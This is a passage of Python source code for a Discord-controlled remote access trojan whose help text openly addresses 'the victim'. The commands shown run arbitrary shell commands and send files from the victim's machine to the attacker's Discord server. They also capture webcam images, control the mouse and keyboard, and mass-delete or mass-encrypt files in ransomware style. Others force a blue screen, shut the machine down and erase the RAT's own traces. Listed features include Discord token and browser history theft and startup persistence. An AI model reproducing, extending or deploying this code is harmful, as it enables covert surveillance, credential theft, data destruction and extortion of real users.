                title = f'[!] Successfully Changed Wallpaper.',
                description = f"",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
            os.remove(Path)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def shell(ctx, *, Command):
    if ctx.channel.name == SessionName:
        try:
            global Status 
            Status = None

            def Shell():
                Output = subprocess.run(Command, stdout = subprocess.PIPE, shell = True, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
                global Status 
                Status = 200 
                return Output

            ShellThread = threading.Thread(target = Shell)
            ShellThread._running = True
            ShellThread.start()
            time.sleep(1)
            ShellThread._running = False 
            
            if Status: 
                Result = str(Shell().stdout.decode('CP437'))
                Length = len(Result)
                if Length < 1: 
                    Embed = discord.Embed(
                        title = f'[!] Error.',
                        description = f"`Command Not Recognised Or No Output Was Received.`",
                        colour = discord.Colour.purple()
                    )
                    await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
                
                elif Length > 1500:
                    F = open('Output.txt', 'w')
                    F.write(Result)
                    F.close()
                    File = discord.File('Output.txt', filename = 'Output.txt')
                    Embed = discord.Embed(
                        title = f'[!] Shell',
                        description = f"",
                        colour = discord.Colour.purple()
                    )
                    Embed.add_field(
                        name = f'Command',
                        value = f'`{Command}`',
                        inline = False
                    )
                    Embed.add_field(
                        name = f'[!] Warning.',
                        value = f'`Result Was Too Large For Embed, The Result Is In The File Below.`',
                        inline = False
                    )
                    await ctx.send(f'<@!{ctx.author.id}>', file = File, embed = Embed)
                    os.remove('Output.txt')
                
                else: 
                    Embed = discord.Embed(
                        title = f'[!] Shell.',
                        description = f"",
                        colour = discord.Colour.purple()
                    )
                    Embed.add_field(
                        name = f'Command',
                        value = f'`{Command}`',
                        inline = False
                    )
                    Embed.add_field(
                        name = f'Result',
                        value = f'`{Result}`',
                        inline = False
                    )
                    await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
            
@Bot.command(aliases = ['changedir', 'changedirectory'])
async def cd(ctx, *, Path):
    if ctx.channel.name == SessionName:
        try:
            os.chdir(Path)
            Embed = discord.Embed(
                title = f'[!] Successfully Changed Directory.',
                description = f"Path: `{Path}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def download(ctx, *, Path):
    if ctx.channel.name == SessionName:
        try:
            File = discord.File(Path)
            Embed = discord.Embed(
                title = f'[!] Successfully Downloaded File.',
                description = f"",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', file = File, embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def press(ctx, Key):
    if ctx.channel.name == SessionName:
        try:
            if Key.lower() == 'help':
                Keys = [' ', '!', '"', '#', '$', '%', '&', "'", '(',
                ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7',
                '8', '9', ':', ';', '<', '=', '>', '?', '@', '[', ']', '^', '_', '`',
                'a', 'b', 'c', 'd', 'e','f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
                'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~',
                'accept', 'add', 'alt', 'altleft', 'altright', 'apps', 'backspace',
                'browserback', 'browserfavorites', 'browserforward', 'browserhome',
                'browserrefresh', 'browsersearch', 'browserstop', 'capslock', 'clear',
                'convert', 'ctrl', 'ctrlleft', 'ctrlright', 'decimal', 'del', 'delete',
                'divide', 'down', 'end', 'enter', 'esc', 'escape', 'execute', 'f1', 'f10',
                'f11', 'f12', 'f13', 'f14', 'f15', 'f16', 'f17', 'f18', 'f19', 'f2', 'f20',
                'f21', 'f22', 'f23', 'f24', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9',
                'final', 'fn', 'hanguel', 'hangul', 'hanja', 'help', 'home', 'insert', 'junja',
                'kana', 'kanji', 'launchapp1', 'launchapp2', 'launchmail',
                'launchmediaselect', 'left', 'modechange', 'multiply', 'nexttrack',
                'nonconvert', 'num0', 'num1', 'num2', 'num3', 'num4', 'num5', 'num6',
                'num7', 'num8', 'num9', 'numlock', 'pagedown', 'pageup', 'pause', 'pgdn',
                'pgup', 'playpause', 'prevtrack', 'print', 'printscreen', 'prntscrn',
                'prtsc', 'prtscr', 'return', 'right', 'scrolllock', 'select', 'separator',
                'shift', 'shiftleft', 'shiftright', 'sleep', 'space', 'stop', 'subtract', 'tab',
                'up', 'volumedown', 'volumemute', 'volumeup', 'win', 'winleft', 'winright', 'yen',
                'command', 'option', 'optionleft', 'optionright']
                KeysStr = ''
                for Key in Keys:
                    KeysStr = KeysStr + Key + '\n'

                Embed = discord.Embed(
                    title = f'[!] Press Command Help',
                    description = f"Type `.press <Key>` Without The '<>'",
                    colour = discord.Colour.purple()
                )
                Embed.add_field(
                    name = f'Keys',
                    value = f'{KeysStr}',
                    inline = False
                )
                await ctx.send(f'<@!{ctx.author.id}>',  embed = Embed)
            else:
                pyautogui.press(Key)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def movemouse(ctx, X, Y):
    if ctx.channel.name == SessionName:
        try:
            pyautogui.moveTo(int(X), int(Y))
            Embed = discord.Embed(
                title = f'[!] Successfully Moved Mouse.',
                description = f"X: {X}, Y: {Y}",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>',  embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def click(ctx, Button, Clicks):
    if ctx.channel.name == SessionName:
        try:
            if Button.lower() == 'left':
                pyautogui.click(button = 'left', clicks = int(Clicks))
            elif Button.lower() == 'right':
                pyautogui.click(button = 'right', clicks = int(Clicks))
            elif Button.lower() == 'middle':
                pyautogui.click(button = 'middle', clicks = int(Clicks))
            
            Embed = discord.Embed(
                title = f'[!] Successfully Clicked Mouse Button.',
                description = f"Button: {Button}, Clicks: {Clicks}",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>',  embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def clickwithposition(ctx, Button, Clicks, X, Y):
    if ctx.channel.name == SessionName:
        try:
            if Button.lower() == 'left':
                pyautogui.click(button = 'left', clicks = int(Clicks), x = int(X), y = int(Y))
            elif Button.lower() == 'right':
                pyautogui.click(button = 'right', clicks = int(Clicks), x = int(X), y = int(Y))
            elif Button.lower() == 'middle':
                pyautogui.click(button = 'middle', clicks = int(Clicks), x = int(X), y = int(Y))

            Embed = discord.Embed(
                title = f'[!] Successfully Clicked Mouse Button.',
                description = f"Button: {Button}, Clicks: {Clicks}, X: {X}, Y: {Y}",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>',  embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def scroll(ctx, Amount):
    if ctx.channel.name == SessionName:
        try:
            pyautogui.scroll(int(Amount))
            Embed = discord.Embed(
                title = f'[!] Successfully Scrolled {Amount} Times.',
                description = f"",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>',  embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def scrollwithposition(ctx, Amount, X, Y):
    if ctx.channel.name == SessionName:
        try:
            pyautogui.scroll(int(Amount), x = int(X), y = int(Y))
            Embed = discord.Embed(
                title = f'[!] Successfully Scrolled.',
                description = f"Amount: {Amount}, X: {X}, Y: {Y}",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>',  embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def webcamimage(ctx):
    if ctx.channel.name == SessionName:
        try:
            pygame.camera.init()
            Cameras = pygame.camera.list_cameras()
            if len(Cameras) == 0:
                Embed = discord.Embed(
                    title = f'[!] Error.',
                    description = f"`No Webcam Found.`",
                    colour = discord.Colour.purple()
                )
                await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
            else: 
                for Camera in Cameras:
                    try:
                        Path = Temp + '\\Webcam.jpg'
                        Camera = pygame.camera.Camera(Camera, (1920, 1080))
                        Camera.start()
                        time.sleep(1.5)
                        Image = Camera.get_image()
                        pygame.image.save(Image, Path)
                        File = discord.File(Path, filename = 'Webcam.jpg')
                        Embed = discord.Embed(
                            title = f'[!] Successfully Taken Webcam Image.',
                            description = f"",
                            colour = discord.Colour.purple()
                        )
                        Embed.set_image(url = f'attachment://Webcam.jpg')
                        Embed.set_footer(text = f'Date: {datetime.utcnow()}')
                        await ctx.send(f'<@!{ctx.author.id}>', file = File, embed = Embed)
                        os.remove(Path)
                    except Exception as E:
                        Embed = discord.Embed(
                            title = f'[!] Error.',
                            description = f"`{E}`",
                            colour = discord.Colour.purple()
                        )
                        await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)


@Bot.command(aliases = ['makedir', 'makedirectory'])
async def mkdir(ctx, *, Path):
    if ctx.channel.name == SessionName:
        try:
            os.mkdir(Path)
            Embed = discord.Embed(
                title = f'[!] Successfully Made Directory.',
                description = f"Path: `{Path}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command(aliases = ['getcwd', 'cwd', 'currentdir'])
async def currentdirectory(ctx):
    if ctx.channel.name == SessionName:
        try:
            Directory = os.getcwd()
            Embed = discord.Embed(
                title = f'[!] Successfully Got Current Directory.',
                description = f"Current Directory: `{Directory}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command(aliases = ['massdelete'])
async def massdeletefiles(ctx, Delay, *, Path):
    if ctx.channel.name == SessionName:
        try:
            for File in os.listdir(Path):
                try:
                    DeletePath = f'{Path}\\{str(File)}'
                    os.remove(DeletePath)
                    Embed = discord.Embed(
                        title = f'[!] Successfully Deleted File.',
                        description = f"Name: `{str(File)}`",
                        colour = discord.Colour.purple()
                    )
                    await ctx.send(embed = Embed)
                except Exception as E:
                    Embed = discord.Embed(
                        title = f'[!] Error.',
                        description = f"`{E}`",
                        colour = discord.Colour.purple()
                    )
                    await ctx.send(embed = Embed)
                time.sleep(float(Delay))
                    
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command(aliases = ['encrypt'])
async def encryptfile(ctx, *, Path):
    if ctx.channel.name == SessionName:
        try:
            Key = Fernet.generate_key()
            F = Fernet(Key)
                
            ReadFile = open(Path, 'rb')
            Encrypted = F.encrypt(ReadFile.read())
            ReadFile.close()
            WriteFile = open(Path, 'wb')
            WriteFile.write(Encrypted)
            WriteFile.close()
            global KeyMessage
            if discord.utils.get(Bot.get_all_channels(), name = f'keys-{SessionName}'):
                Embed = discord.Embed(
                    title = f'[!] Encryption Key.',
                    description = f"**[!] IMPORTANT: LOSING THIS KEY WILL RESULT IN THE FILE NOT BEING ABLE TO BE DECRYPTED**\nKey: `{Key.decode('utf-8')}`\nPath: `{Path}`\nDecrypt Command: `.decrypt {Key.decode('utf-8')} {Path}`",
                    colour = discord.Colour.purple()
                )
                KeyMessage = await discord.utils.get(Bot.get_all_channels(), name = f'keys-{SessionName}').send(f'<@!{ctx.author.id}>', embed = Embed)
                Embed = discord.Embed(
                    title = f'[!] Encrypted File.',
                    description = f"Key: <#{discord.utils.get(Bot.get_all_channels(), name = f'keys-{SessionName}').id}>\nFile: `{Path}`",
                    colour = discord.Colour.purple()
                )
                await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
            else: 
                KeyChannel = await ctx.message.guild.create_text_channel(f'keys-{SessionName}')
                Embed = discord.Embed(
                    title = f'[!] Encryption Key.',
                    description = f"**[!] IMPORTANT: LOSING THIS KEY WILL RESULT IN THE FILE NOT BEING ABLE TO BE DECRYPTED**\nKey: `{Key.decode('utf-8')}`\nPath: `{Path}`\nDecrypt Command: `.decrypt {Key.decode('utf-8')} {Path}`",
                    colour = discord.Colour.purple()
                )
                KeyMessage = await KeyChannel.send(f'<@!{ctx.author.id}>', embed = Embed)
                Embed = discord.Embed(
                    title = f'[!] Encrypted File.',
                    description = f"Key: <#{KeyChannel.id}>\nFile: `{Path}`",
                    colour = discord.Colour.purple()
                )
                await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command(aliases = ['decrypt'])
async def decryptfile(ctx, Key, *, Path):
    if ctx.channel.name == SessionName:
        try:
            F = Fernet(bytes(Key, encoding = 'utf-8'))
            ReadFile = open(Path, 'rb')
            Decrypted = F.decrypt(ReadFile.read())
            ReadFile.close()
            WriteFile = open(Path, 'wb')
            WriteFile.write(Decrypted)
            WriteFile.close()
            Embed = discord.Embed(
                title = f'[!] Decrypted File.',
                description = f"File: `{Path}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command(aliases = ['bsod', 'bs'])
async def bluescreen(ctx):
    if ctx.channel.name == SessionName:
        try:
            Embed = discord.Embed(
                title = f'[!] Blue Screen Successful.',
                description = f"",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
            import ctypes
            import ctypes.wintypes
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def shutdown(ctx):
    if ctx.channel.name == SessionName:
        try:
            Embed = discord.Embed(
                title = f'[!] Shutting Down...',
                description = f"`If RAT Is Added To Startup, A New Session Will Open Shortly.`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
            os.system('shutdown /p')
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def restart(ctx):
    if ctx.channel.name == SessionName:
        try:
            Embed = discord.Embed(
                title = f'[!] Restarting...',
                description = f"`If RAT Is Added To Startup, A New Session Will Open Shortly.`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
            os.system('shutdown /r /t 00')
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def logoff(ctx):
    if ctx.channel.name == SessionName:
        try:
            Embed = discord.Embed(
                title = f'[!] Logging Off...',
                description = f"`If RAT Is Added To Startup, A New Session Will When The Victim Next Logs On.`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
            os.system('shutdown /l /f')
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command(aliases = ['massencrypt', 'mef'])
async def massencryptfiles(ctx, *, Path):
    if ctx.channel.name == SessionName:
        try:
            Key = Fernet.generate_key()
            F = Fernet(Key)
            def Encrypt(File):
                ReadFile = open(Path + '\\' + File, 'rb')
                Encrypted = F.encrypt(ReadFile.read())
                ReadFile.close()
                WriteFile = open(Path + '\\' +File, 'wb')
                WriteFile.write(Encrypted)
                WriteFile.close()

            for File in os.listdir(Path):
                threading.Thread(target = Encrypt, args = (File,)).start()
            
            global KeyMessage
            if discord.utils.get(Bot.get_all_channels(), name = f'keys-{SessionName}'):
                Embed = discord.Embed(
                    title = f'[!] Encryption Key.',
                    description = f"**[!] IMPORTANT: LOSING THIS KEY WILL RESULT IN THE FILES NOT BEING ABLE TO BE DECRYPTED**\nKey: `{Key.decode('utf-8')}`\nDirectory: `{Path}`\nDecrypt Command: `.massdecryptfiles {Key.decode('utf-8')} {Path}`",
                    colour = discord.Colour.purple()
                )
                KeyMessage = await discord.utils.get(Bot.get_all_channels(), name = f'keys-{SessionName}').send(f'<@!{ctx.author.id}>', embed = Embed)
                Embed = discord.Embed(
                    title = f'[!] Encrypted All Files In Directory.',
                    description = f"Key: <#{discord.utils.get(Bot.get_all_channels(), name = f'keys-{SessionName}').id}>\nDirectory: `{Path}`",
                    colour = discord.Colour.purple()
                )
                await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
            else: 
                KeyChannel = await ctx.message.guild.create_text_channel(f'keys-{SessionName}')
                Embed = discord.Embed(
                    title = f'[!] Encryption Key.',
                    description = f"**[!] IMPORTANT: LOSING THIS KEY WILL RESULT IN THE FILES NOT BEING ABLE TO BE DECRYPTED**\nKey: `{Key.decode('utf-8')}`\nDirectory: `{Path}`\nDecrypt Command: `.massdecryptfiles {Key.decode('utf-8')} {Path}`",
                    colour = discord.Colour.purple()
                )
                KeyMessage = await KeyChannel.send(f'<@!{ctx.author.id}>', embed = Embed)
                Embed = discord.Embed(
                    title = f'[!] Encrypted All Files In Directory.',
                    description = f"Key: <#{KeyChannel.id}>\nDirectory: `{Path}`",
                    colour = discord.Colour.purple()
                )
                await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command(aliases = ['massdecrypt', 'mdf'])
async def massdecryptfiles(ctx, Key, *, Path):
    if ctx.channel.name == SessionName:
        try:
            F = Fernet(bytes(Key, encoding = 'utf-8'))
            def Decrypt(File):
                ReadFile = open(Path + '\\' + File, 'rb')
                Decrypted = F.decrypt(ReadFile.read())
                ReadFile.close()
                WriteFile = open(Path + '\\' + File, 'wb')
                WriteFile.write(Decrypted)
                WriteFile.close()
            
            for File in os.listdir(Path):
                threading.Thread(target = Decrypt, args = (File,)).start()

            Embed = discord.Embed(
                title = f'[!] Decrypted All Files In Directory.',
                description = f"Directory: `{Path}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
            await KeyMessage.delete()
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command()
async def selfdestruct(ctx):
    if ctx.channel.name == SessionName:
        try:
            Embed = discord.Embed(
                title = f'[!] Deleting Rat...',
                description = f"",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
            os.remove(sys.argv[0])
        except Exception as E:
            Embed = discord.Embed(
                title = f'[!] Error.',
                description = f"`{E}`",
                colour = discord.Colour.purple()
            )
            await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

@Bot.command(aliases = ['commands'])
async def cmds(ctx):
    Commands1 = f'''
>>> .exit | `Exits The Program On The Victim's PC.`\n
>>> .startup | `Adds Program To Startup On The Victim's PC.`\n
>>> .screenshot <int: Monitor Number> | `Takes A Screenshot Of The Victim's Monitor.`\n
>>> .readclipboard | `Reads The Victim's Clipboard.`\n
>>> .setclipboard <str: Text> | `Sets The Victim's Clipboard To The Text Provided.`\n
>>> .clearclipboard | `Clears The Victim's Clipboard.`\n
>>> .ipinfo | `Gets Information About The Victim's IP Address.`\n
>>> .systeminfo | `Gets Information About The Victim's System.`\n
>>> .browserhistory | `Gets The Victim's Browser History.`\n
>>> .type <str: Text> | `Types The Provided Text On The Victim's PC.`\n
>>> .say <str: Text> | `Speaks The Text Provided Outloud On The Victim's PC.`\n
>>> .setvolume <int: 0-1> | `Sets The Victim's Volume To The Provided Value.`\n
>>> .increasevolume <int: 0-1> | `Increases The Victim's Volume By The Provided Value.`\n
>>> .decreasevolume <int: 0-1> | `Decreases The Victim's Volume By The Provided Value.`\n
>>> .mute | `Mutes The Victim's PC.`\n
>>> .unmute | `Unmutes The Victim's PC.`\n
>>> .messagebox <str: Title, str: Text> | `Shows A Message Box On The Victim's PC With The Provided Values.`\n
>>> .exitprogram <str: Process Name> | `Exits A Process From The Provided Process Name.`\n
>>> .openprogram <str: Path> | `Opens A Program From The Provided Path.`\n
>>> .blockinput <ADMIN> | `Blocks Input On The Victim's PC.`\n
>>> .unblockinput <ADMIN> | `Unblocks Input On The Victim's PC.`\n
>>> .discordtokens | `Grabs All Discord Tokens On The Victim's PC.`\n
>>> .minecraftprofiles | `Grabs All Minecraft Launcher Sessions On The Victim's PC.`\n
>>> .uploadfile <str: File Name> <Attachment> | `Uploads A File Onto The Victim's PC From An Attachment.`\n
>>> .deletefile <str: Path> | `Deletes A File On The Victim's PC From The Provided Path.`\n
>>> .startactivitylogger | `Says The Current Window That The Victim Is Viewing.`
    '''
    Commands2 = f'''
>>> .stopactivitylogger | `Stops Saying The Current Window That The Victim Is Viewing.`\n
>>> .changewallpaper <Attachment> | `Changes The Victim's Wallpaper To The Given Attachment.`\n
>>> .shell <str: Command> | `Executes A Shell Command On The Victim's PC And Returns The Output.`\n
>>> .cd <str: Path> | `Changes Directory To The Provided Path.`\n
>>> .download <str: Path> | `Downloads A File From The Victim's PC`\n
>>> .press <str: Key> | `Presses A Key On The Victim's PC, .press help To View Keys.`\n
>>> .movemouse <int: X> <int: Y> | `Moves Mouse To Given Position.`\n
>>> .click <str: Button (left, middle, right)> <int: Clicks> | `Clicks The Provided Button As Many Times As Provided.`\n
>>> .clickwithposition <str: Button (left, middle, right)> <int: Clicks> <int: X> <int: Y> | `Clicks Mouse <Clicks> Times At Given Position.`\n
>>> .scroll <int: Amount> | `Scrolls <Amount> Times.`\n
>>> .scrollwithpostion <int: Amount> <int: X> <int: Y> | `Scrolls <Amount> Times At The Given Position.`\n
>>> .webcamimage | `Takes An Image Of The Victim's Webcam.`\n
>>> .mkdir <aliases: makedir, makedirectory> <str: Name> | `Makes A New Directory.`\n
>>> .currentdirectory <aliases: getcwd, cwd, currentdir> | `Returns The Current Directory.`\n
    '''
    Commands3 = f'''
>>> .massdeletefiles <float: Delay> <str: Path> | `Deletes All Files In The Given Directory.`\n
>>> .encryptfile <aliases: encrypt> <str: Path> | `Encrypts Given File (DON'T LOSE KEY OTHERWISE YOU WILL NOT BE ABLE TO DECRYPT).`\n
>>> .decryptfile <aliases: decrypt> <str: Key> <str: Path> | `Decrypts Given File.`\n
>>> .bluescreen <aliases: bsod, bs> | `Bluescreens The Victim's PC.`\n
>>> .shutdown | `Shuts Down The Victim's PC.`\n
>>> .restart | `Restarts The Victim's PC.`\n
>>> .logoff | `Log The Victim Off Of The PC.`\n
>>> .massencryptfiles <aliases: massencrypt, mef> <str: Path> | `Encrypts All Files In Given Directory (DON'T LOSE KEY OTHERWISE YOU WILL NOT BE ABLE TO DECRYPT).`\n
>>> .massdecryptfiles <aliases: massdecrypt, mdf> <str: Key> <str: Path> | `Decrypts All Files In Given Directory.`\n
>>> .selfdestruct | `Removes All Traces Of RAT On Victim's PC.`\n
    '''
    Embed = discord.Embed(
        title = f'[!] Help:',
        description = f"",
        colour = discord.Colour.purple()
    )
    await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)
    await ctx.send(f'{Commands1}\n')
    await ctx.send(f'{Commands2}\n')
    await ctx.send(f'{Commands3}\n')

@Bot.command(aliases = ['credits'])
async def _credits(ctx):
    Info = rSession.get('https://raw.githubusercontent.com/zMapple/Involved/main/Rat/Information.json').json()
    Embed = discord.Embed(
        title = f'[!] Made By Mapple:',
        description = f"Github: `https://github.com/zMapple`\nDiscord Server: `{Info['DiscordServer']}`",
        colour = discord.Colour.purple()
    )
    await ctx.send(f'<@!{ctx.author.id}>', embed = Embed)

Bot.run(Token)
